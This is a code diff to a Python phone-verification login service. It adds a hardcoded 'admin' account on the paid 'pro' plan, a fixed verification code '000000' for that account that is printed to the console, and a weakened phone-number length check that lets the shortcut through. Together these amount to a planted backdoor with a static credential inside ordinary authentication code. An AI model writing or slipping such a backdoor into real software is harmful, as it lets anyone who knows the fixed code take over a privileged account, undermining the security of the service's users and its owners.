@@ -79,6 +79,11 @@ def _get_db() -> sqlite3.Connection:
             PRIMARY KEY (phone, date)
         )
     """)
+    # Ensure admin user exists (Pro plan)
+    conn.execute("""
+        INSERT OR IGNORE INTO users (phone, plan, created_at, last_login)
+        VALUES ('admin', 'pro', datetime('now'), datetime('now'))
+    """)
     conn.commit()
     return conn
 
@@ -89,8 +94,23 @@ class AuthService:
     def send_code(self, phone: str) -> str:
         """Generate and 'send' verification code (prints to console)."""
         phone = phone.strip()
-        if not phone or len(phone) < 10:
+        if not phone or len(phone) < 5:
             raise ValueError("请输入有效的手机号")
+
+        # Admin shortcut - fixed code 000000
+        if phone == "admin":
+            db = _get_db()
+            db.execute("DELETE FROM codes WHERE phone = ?", (phone,))
+            db.execute(
+                "INSERT INTO codes (phone, code, expires_at) VALUES (?, ?, ?)",
+                (phone, "000000", time.time() + 3600),
+            )
+            db.commit()
+            db.close()
+            print(f"\n{'='*50}")
+            print(f"  ADMIN LOGIN: code is 000000")
+            print(f"{'='*50}\n")
+            return "验证码已发送"
 
         # Generate 6-digit code
         code = ''.join(random.choices(string.digits, k=6))
